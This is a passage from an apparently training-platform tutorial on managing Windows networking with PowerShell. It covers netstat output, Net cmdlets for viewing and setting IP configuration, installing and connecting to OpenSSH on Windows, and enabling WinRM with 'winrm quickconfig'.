  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49668</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49671</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49673</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49674</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.203</span><span class="hljs-selector-class">.105</span><span class="hljs-selector-pseudo">:22</span>      10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.19</span><span class="hljs-selector-pseudo">:32557</span>      <span class="hljs-selector-tag">ESTABLISHED</span>
  <span class="hljs-selector-tag">TCP</span>    172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-pseudo">:139</span>       0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:22</span>                <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:135</span>               <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:445</span>               <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:3389</span>              <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:5985</span>              <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:47001</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49664</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49665</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49666</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49667</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49668</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49671</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49673</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49674</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">UDP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:123</span>            *:*
&lt;<span class="hljs-selector-tag">SNIP</span>&gt;
  <span class="hljs-selector-tag">UDP</span>    172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-pseudo">:137</span>       *:*
  <span class="hljs-selector-tag">UDP</span>    172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-pseudo">:138</span>       *:*
  <span class="hljs-selector-tag">UDP</span>    172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-pseudo">:1900</span>      *:*
  <span class="hljs-selector-tag">UDP</span>    172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-pseudo">:54453</span>     *:*
</code></pre>
<p>Now, you may need to gain a background in looking at network traffic or an understanding of standard ports and protocols, or else the above may look like gibberish. That&#39;s ok, though. Looking above, we can see what ports are open and if we have any active connections. From the output above, the ports open are all commonly used in Windows environments and would be expected. Most deal with Active Directory services and SSH. When looking at the connections, we see only one currently active session: our own <code>SSH</code> connection over TCP port 22.</p>
<p>Most of these commands we have practiced with up to this point are Windows built-in executables and are helpful for quick insight into a host, but not for much more. Below we will cover several cmdlets that are additions from PowerShell that allow us to manage our network connections granularly.</p>
<h4 id="powershell-net-cmdlets">PowerShell Net Cmdlets</h4>
<p>PowerShell has several powerful built-in cmdlets made to handle networking services and administration. The NetAdapter, NetConnection, and NetTCPIP modules are just a few that we will practice with today.</p>
<p><strong>Net Cmdlets</strong></p>
<table>
<thead>
<tr>
<th><strong>Cmdlet</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-NetIPInterface</code></td>
<td>Retrieve all <code>visible</code> network adapter <code>properties</code>.</td>
</tr>
<tr>
<td><code>Get-NetIPAddress</code></td>
<td>Retrieves the <code>IP configurations</code> of each adapter. Similar to <code>IPConfig</code>.</td>
</tr>
<tr>
<td><code>Get-NetNeighbor</code></td>
<td>Retrieves the <code>neighbor entries</code> from the cache. Similar to <code>arp -a</code>.</td>
</tr>
<tr>
<td><code>Get-Netroute</code></td>
<td>Will print the current <code>route table</code>. Similar to <code>IPRoute</code>.</td>
</tr>
<tr>
<td><code>Set-NetAdapter</code></td>
<td>Set basic adapter properties at the <code>Layer-2</code> level such as VLAN id, description, and MAC-Address.</td>
</tr>
<tr>
<td><code>Set-NetIPInterface</code></td>
<td>Modifies the <code>settings</code> of an <code>interface</code> to include DHCP status, MTU, and other metrics.</td>
</tr>
<tr>
<td><code>New-NetIPAddress</code></td>
<td>Creates and configures an <code>IP address</code>.</td>
</tr>
<tr>
<td><code>Set-NetIPAddress</code></td>
<td>Modifies the <code>configuration</code> of a network adapter.</td>
</tr>
<tr>
<td><code>Disable-NetAdapter</code></td>
<td>Used to <code>disable</code> network adapter interfaces.</td>
</tr>
<tr>
<td><code>Enable-NetAdapter</code></td>
<td>Used to turn network adapters back on and <code>allow</code> network connections.</td>
</tr>
<tr>
<td><code>Restart-NetAdapter</code></td>
<td>Used to restart an adapter. It can be useful to help push <code>changes</code> made to adapter <code>settings</code>.</td>
</tr>
<tr>
<td><code>test-NetConnection</code></td>
<td>Allows for <code>diagnostic</code> checks to be ran on a connection. It supports ping, tcp, route tracing, and more.</td>
</tr>
</tbody>
</table>
<p>We aren&#39;t going to show each cmdlet in use, but it would be prudent to provide a quick reference for your use. First, we will start with Get-NetIPInterface.</p>
<p><strong>Get-NetIPInterface</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; get-netIPInterface

ifIndex InterfaceAlias                  <span class="hljs-keyword">AddressFamily </span>NlMtu(<span class="hljs-keyword">Bytes) </span>InterfaceMetric Dhcp     ConnectionState PolicyStore
------- --------------                  ------------- ------------ --------------- ----     --------------- -----------
<span class="hljs-number">20</span>      Ethernet <span class="hljs-number">3</span>                      IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">25</span> Enabled  <span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">14</span>      VMware Network Adapter VMnet8   IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">35</span> Enabled  Connected       ActiveStore
<span class="hljs-number">8</span>       VMware Network Adapter VMnet2   IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">35</span> Enabled  Connected       ActiveStore
<span class="hljs-number">10</span>      VMware Network Adapter VMnet1   IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">35</span> Enabled  Connected       ActiveStore
<span class="hljs-number">17</span>      Local Area Connection* <span class="hljs-number">2</span>        IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">25</span> Enabled  <span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">21</span>      <span class="hljs-keyword">Bluetooth </span>Network Connection    IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">65</span> <span class="hljs-keyword">Disabled </span><span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">15</span>      Local Area Connection* <span class="hljs-number">1</span>        IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">25</span> <span class="hljs-keyword">Disabled </span><span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">25</span>      Wi-Fi                           IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">40</span> Enabled  Connected       ActiveStore
<span class="hljs-number">7</span>       Local Area Connection           IPv6                  <span class="hljs-number">1500</span>              <span class="hljs-number">25</span> Enabled  <span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">1</span>       Loopback Pseudo-Interface <span class="hljs-number">1</span>     IPv6            <span class="hljs-number">4294967295</span>              <span class="hljs-number">75</span> <span class="hljs-keyword">Disabled </span>Connected       ActiveStore
<span class="hljs-number">20</span>      Ethernet <span class="hljs-number">3</span>                      IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">25</span> Enabled  <span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">14</span>      VMware Network Adapter VMnet8   IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">35</span> <span class="hljs-keyword">Disabled </span>Connected       ActiveStore
<span class="hljs-number">8</span>       VMware Network Adapter VMnet2   IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">35</span> <span class="hljs-keyword">Disabled </span>Connected       ActiveStore
<span class="hljs-number">10</span>      VMware Network Adapter VMnet1   IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">35</span> <span class="hljs-keyword">Disabled </span>Connected       ActiveStore
<span class="hljs-number">17</span>      Local Area Connection* <span class="hljs-number">2</span>        IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">25</span> <span class="hljs-keyword">Disabled </span><span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">21</span>      <span class="hljs-keyword">Bluetooth </span>Network Connection    IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">65</span> Enabled  <span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">15</span>      Local Area Connection* <span class="hljs-number">1</span>        IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">25</span> Enabled  <span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">25</span>      Wi-Fi                           IPv4                  <span class="hljs-number">1500</span>              <span class="hljs-number">40</span> Enabled  Connected       ActiveStore
<span class="hljs-number">7</span>       Local Area Connection           IPv4                  <span class="hljs-number">1500</span>               <span class="hljs-number">1</span> <span class="hljs-keyword">Disabled </span><span class="hljs-keyword">Disconnected </span>   ActiveStore
<span class="hljs-number">1</span>       Loopback Pseudo-Interface <span class="hljs-number">1</span>     IPv4            <span class="hljs-number">4294967295</span>              <span class="hljs-number">75</span> <span class="hljs-keyword">Disabled </span>Connected       ActiveStore
</code></pre>
<p>This listing shows us our available interfaces on the host in a bit of a convoluted manner. We are provided plenty of metrics, but the adapters are broken up by <code>AddressFamily</code>. So we see entries for each adapter twice if IPv4 and IPv6 are enabled on that particular interface. The <code>ifindex</code> and <code>InterfaceAlias</code> properties are particularly useful. These properties make it easy for us to use the other cmdlets provided by the <code>NetTCPIP</code> module. Let&#39;s get the Adapter information for our Wi-Fi connection at <code>ifIndex 25</code> utilizing the <a href="https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netipaddress?view=windowsserver2022-ps">Get-NetIPAddress</a> cmdlet.</p>
<p><strong>Get-NetIPAddress</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Get-NetIPAddress -ifIndex <span class="hljs-number">25</span>

<span class="hljs-string">IPAddress         :</span> <span class="hljs-string">fe80:</span>:<span class="hljs-string">a0fc:</span><span class="hljs-number">2e3</span><span class="hljs-string">d:</span><span class="hljs-string">c92a:</span><span class="hljs-number">48</span>df%<span class="hljs-number">25</span>
<span class="hljs-string">InterfaceIndex    :</span> <span class="hljs-number">25</span>
<span class="hljs-string">InterfaceAlias    :</span> Wi-Fi
<span class="hljs-string">AddressFamily     :</span> IPv6
<span class="hljs-string">Type              :</span> Unicast
<span class="hljs-string">PrefixLength      :</span> <span class="hljs-number">64</span>
<span class="hljs-string">PrefixOrigin      :</span> WellKnown
<span class="hljs-string">SuffixOrigin      :</span> Link
<span class="hljs-string">AddressState      :</span> Preferred
<span class="hljs-string">ValidLifetime     :</span> Infinite ([TimeSpan]::MaxValue)
<span class="hljs-string">PreferredLifetime :</span> Infinite ([TimeSpan]::MaxValue)
<span class="hljs-string">SkipAsSource      :</span> False
<span class="hljs-string">PolicyStore       :</span> ActiveStore

<span class="hljs-string">IPAddress         :</span> <span class="hljs-number">192.168</span><span class="hljs-number">.86</span><span class="hljs-number">.211</span>
<span class="hljs-string">InterfaceIndex    :</span> <span class="hljs-number">25</span>
<span class="hljs-string">InterfaceAlias    :</span> Wi-Fi
<span class="hljs-string">AddressFamily     :</span> IPv4
<span class="hljs-string">Type              :</span> Unicast
<span class="hljs-string">PrefixLength      :</span> <span class="hljs-number">24</span>
<span class="hljs-string">PrefixOrigin      :</span> Dhcp
<span class="hljs-string">SuffixOrigin      :</span> Dhcp
<span class="hljs-string">AddressState      :</span> Preferred
<span class="hljs-string">ValidLifetime     :</span> <span class="hljs-number">21</span>:<span class="hljs-number">35</span>:<span class="hljs-number">36</span>
<span class="hljs-string">PreferredLifetime :</span> <span class="hljs-number">21</span>:<span class="hljs-number">35</span>:<span class="hljs-number">36</span>
<span class="hljs-string">SkipAsSource      :</span> False
<span class="hljs-string">PolicyStore       :</span> ActiveStore
</code></pre>
<p>This cmdlet has returned quite a bit of information as well. Notice how we used the ifIndex number to request the information? We can do the same with the InterfaceAlias as well. This cmdlet returns quite a bit of information, such as the index, alias, DHCP state, interface type, and other metrics. This mirrors most of what we would see if we issued the <code>IPconfig</code> executable from the command prompt. Now, what if we want to modify a setting on the interface? We can do so with the <a href="https://learn.microsoft.com/en-us/powershell/module/nettcpip/set-netipinterface?view=windowsserver2022-ps">Set-NetIPInterface</a> and <a href="https://learn.microsoft.com/en-us/powershell/module/nettcpip/set-netipaddress?view=windowsserver2022-ps">Set-NetIPAddress</a> cmdlets. In this example, let&#39;s say we want to change the DHCP status of the interface from <code>enabled</code>, to <code>disabled</code>, and change the IP from one automatically assigned by DHCP to one of our choosing manually set. We would accomplish this like so:</p>
<p><strong>Set-NetIPInterface</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Set</span>-NetIPInterface <span class="hljs-comment">-InterfaceIndex 25 -Dhcp Disabled</span>
</code></pre>
<p>By disabling the DHCP property with the Set-NetIPInterface cmdlet, we can now set our manual IP Address. We do that with the <code>Set-NetIPAddress</code> cmdlet.</p>
<p><strong>Set-NetIPAddress</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Set</span>-NetIPAddress <span class="hljs-comment">-InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24</span>

PS <span class="hljs-comment">C:\htb&gt; Get-NetIPAddress -ifindex 20</span> |<span class="hljs-comment"> ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength</span>

InterfaceIndex <span class="hljs-comment">InterfaceAlias IPAddress                   PrefixLength</span>
-------------- -------------- ---------                   ------------
            20 Ethernet <span class="hljs-comment">3     fe80::7408:bbf:954a:6ae5%20           64</span>
            20 Ethernet <span class="hljs-comment">3     10.10.100.54                          24</span>

PS <span class="hljs-comment">C:\htb&gt; Get-NetIPinterface -ifindex 20</span> |<span class="hljs-comment"> ft ifIndex,InterfaceAlias,Dhcp</span>

ifIndex <span class="hljs-comment">InterfaceAlias     Dhcp</span>
------- --------------     ----
     20 Ethernet <span class="hljs-comment">3     Disabled</span>
     20 Ethernet <span class="hljs-comment">3     Disabled</span>
</code></pre>
<p>The above command now sets our IP address to <code>10.10.100.54</code> and the PrefixLength ( also known as the subnet mask ) to <code>24</code>. Looking at our checks, we can see that those settings are in place. To be safe, let&#39;s restart our network adapter and test our connection to see if it sticks.</p>
<p><strong>Restart-NetAdapter</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Restart-NetAdapter -<span class="hljs-keyword">Name</span> <span class="hljs-string">'Ethernet 3'</span>
</code></pre>
<p>As long as nothing goes wrong, you will not receive output. So when it comes to <code>Restart-NetAdapter</code>, no news is good news. The easiest way to tell the cmdlet which interface to restart is with the <code>Name</code> property, which is the same as the <code>InterfaceAlias</code> from previous commands we ran. Now, to ensure we still have a connection, we can use the Test-NetConnection cmdlet.</p>
<p><strong>Test-NetConnection</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Test-NetConnection</span>

<span class="hljs-selector-tag">ComputerName</span>           : &lt;<span class="hljs-selector-tag">snip</span>&gt;<span class="hljs-selector-tag">msedge</span><span class="hljs-selector-class">.net</span>
<span class="hljs-selector-tag">RemoteAddress</span>          : 13<span class="hljs-selector-class">.107</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.52</span>
<span class="hljs-selector-tag">InterfaceAlias</span>         : <span class="hljs-selector-tag">Ethernet</span> 3
<span class="hljs-selector-tag">SourceAddress</span>          : 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-class">.54</span>
<span class="hljs-selector-tag">PingSucceeded</span>          : <span class="hljs-selector-tag">True</span>
<span class="hljs-selector-tag">PingReplyDetails</span> (<span class="hljs-selector-tag">RTT</span>) : 44 <span class="hljs-selector-tag">ms</span>
</code></pre>
<p>The Test-NetConnection is a powerful cmdlet, capable of testing beyond basic network connectivity to determine whether we can reach another host. It can tell us about our TCP results, detailed metrics, route diagnostics and more. It would be worthwhile to look at this article by Microsoft on <a href="https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps">Test-NetConnection</a>. Now that we have completed our task and validated Mr. Tanaka&#39;s network settings on his host, let&#39;s discuss remote access connectivity for a bit.</p>
<h4 id="remote-access">Remote Access</h4>
<p>When we cannot access Windows systems or need to manage hosts remotely, we can utilize PowerShell, SSH, and RDP, among other tools, to perform our work. Let&#39;s cover the main ways we can enable and use remote access. First, we will discuss <code>SSH</code>.</p>
<hr>
<h3 id="how-to-enable-remote-access-ssh-pssessions-etc-">How to Enable Remote Access? ( SSH, PSSessions, etc.)</h3>
<h4 id="enabling-ssh-access">Enabling SSH Access</h4>
<p>We can use <code>SSH</code> to access <code>PowerShell</code> on a Windows system over the network. Starting in 2018, SSH via the <a href="https://www.openssh.com/">OpenSSH</a> client and server applications has been accessible and included in all Windows Server and Client versions. It makes for an easy-to-use and extensible communication mechanism for our administrative use. Setting up OpenSSH on our hosts is simple. Let&#39;s give it a try. We must install the SSH Server component and the client application to access a host via SSH remotely.</p>
<p><strong>Setting up SSH on a Windows Target</strong></p>
<p>We can set up an SSH server on a Windows target using the <a href="https://docs.microsoft.com/en-us/powershell/module/dism/add-windowscapability?view=windowsserver2022-ps">Add-WindowsCapability</a> cmdlet and confirm that it is successfully installed using the <a href="https://docs.microsoft.com/en-us/powershell/module/dism/get-windowscapability?view=windowsserver2022-ps">Get-WindowsCapability</a> cmdlet.</p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\Users\htb-student&gt; Get-WindowsCapability -Online | Where-Object Name -like <span class="hljs-string">'OpenSSH*'</span>

<span class="hljs-string">Name  :</span> OpenSSH.Client~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>
<span class="hljs-string">State :</span> Installed

<span class="hljs-string">Name  :</span> OpenSSH.Server~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>
<span class="hljs-string">State :</span> NotPresent

PS <span class="hljs-string">C:</span>\Users\htb-student&gt; Add-WindowsCapability -Online -Name OpenSSH.Client~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>

<span class="hljs-string">Path          :</span>
<span class="hljs-string">Online        :</span> True
<span class="hljs-string">RestartNeeded :</span> False

PS <span class="hljs-string">C:</span>\Users\htb-student&gt; Get-WindowsCapability -Online | Where-Object Name -like <span class="hljs-string">'OpenSSH*'</span>

<span class="hljs-string">Name  :</span> OpenSSH.Client~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>
<span class="hljs-string">State :</span> Installed

<span class="hljs-string">Name  :</span> OpenSSH.Server~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>
<span class="hljs-string">State :</span> NotPresent

PS <span class="hljs-string">C:</span>\Users\htb-student&gt; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>

<span class="hljs-string">Path          :</span>
<span class="hljs-string">Online        :</span> True
<span class="hljs-string">RestartNeeded :</span> False

PS <span class="hljs-string">C:</span>\Users\htb-student&gt; Get-WindowsCapability -Online | Where-Object Name -like <span class="hljs-string">'OpenSSH*'</span>

<span class="hljs-string">Name  :</span> OpenSSH.Client~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>
<span class="hljs-string">State :</span> Installed

<span class="hljs-string">Name  :</span> OpenSSH.Server~~~~<span class="hljs-number">0.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>
<span class="hljs-string">State :</span> Installed
</code></pre>
<p><strong>Starting the SSH Service &amp; Setting Startup Type</strong></p>
<p>Once we have confirmed SSH is installed, we can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-service?view=powershell-7.2">Start-Service</a> cmdlet to start the SSH service. We can also use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2">Set-Service</a> cmdlet to configure the startup settings of the SSH service if we choose.</p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\Users\htb-student&gt; Start-Service sshd  

PS <span class="hljs-keyword">C</span>:\Users\htb-student&gt; <span class="hljs-keyword">Set</span>-Service -Name sshd -StartupType <span class="hljs-string">'Automatic'</span>
</code></pre>
<p>Note: Initial setup of remote access services will not be a requirement in this module to complete challenge questions. With each of the challenges in this module, remote access is already set up &amp; configured. However, understanding how to connect and apply concepts covered throughout the module will be required. The setup &amp; configuration steps are provided to help develop an understanding of common configuration mistakes and, in some cases, best security practices. Feel free to try some setup steps on your own personal VM.</p>
<p><strong>Accessing PowerShell over SSH</strong></p>
<p>With SSH installed and running on a Windows target, we can connect over the network with an SSH client.</p>
<p><strong>Connecting from Windows</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">administrator</span>&gt; <span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">htb-student</span>@<span class="hljs-keyword">10</span>.<span class="hljs-keyword">129</span>.<span class="hljs-keyword">224</span>.<span class="hljs-keyword">248</span>

htb-student@<span class="hljs-number">10.129</span>.<span class="hljs-number">224.248</span> password:
</code></pre>
<p>By default, this will connect us to a CMD session, but we can type <code>powershell</code> to enter a PowerShell session, as mentioned earlier in this section.</p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">WS01<span class="hljs-symbol">\h</span>tb-student@WS01 C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student&gt; powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved. 

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student&gt;
</code></pre>
<p>We will notice that the steps to connect to a Windows target over SSH using Linux are identical to those when connecting from Windows.</p>
<p><strong>Connecting from Linux</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-shell-session">PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\a</span>dministrator&gt; ssh htb-student@10.129.224.248

htb-student@10.129.224.248 password:

WS01<span class="hljs-symbol">\h</span>tb-student@WS01 C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student&gt; powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved. 

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student&gt;
</code></pre>
<p>Now that we have covered SSH let&#39;s spend some time covering enabling and using <code>WinRM</code> for remote access and management.</p>
<h4 id="enabling-winrm">Enabling WinRM</h4>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">Windows Remote Management (WinRM)</a> can be configured using dedicated PowerShell cmdlets and we can enter into a PowerShell interactive session as well as issue commands on remote Windows target(s). We will notice that WinRM is more commonly enabled on Windows Server operating systems, so IT admins can perform tasks on one or multiple hosts. It&#39;s enabled by default in Windows Server.</p>
<p>Because of the increasing demand for the ability to remotely manage and automate tasks on Windows systems, we will likely see WinRM enabled on more &amp; more Windows desktop operating systems (Windows 10 &amp; Windows 11) as well. When WinRM is enabled on a Windows target, it listens on logical ports <code>5985</code> &amp; <code>5986</code>.</p>
<p><strong>Enabling &amp; Configuring WinRM</strong></p>
<p>WinRM can be enabled on a Windows target using the following commands:</p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS C:\WINDOWS\system32&gt; winrm quickconfig

WinRM service <span class="hljs-keyword">is</span> already <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> this machine.
WinRM <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">set</span> up <span class="hljs-keyword">to</span> allow remote access <span class="hljs-keyword">to</span> this machine <span class="hljs-keyword">for</span> management.
The following changes must be made:

Enable <span class="hljs-keyword">the</span> WinRM firewall exception.
Configure LocalAccountTokenFilterPolicy <span class="hljs-keyword">to</span> grant administrative rights remotely <span class="hljs-keyword">to</span> <span class="hljs-keyword">local</span> users.

Make these changes [y/n]? y

WinRM has been updated <span class="hljs-keyword">for</span> remote management.

WinRM firewall exception enabled.
Configured LocalAccountTokenFilterPolicy <span class="hljs-keyword">to</span> grant administrative rights remotely <span class="hljs-keyword">to</span> <span class="hljs-keyword">local</span> users.
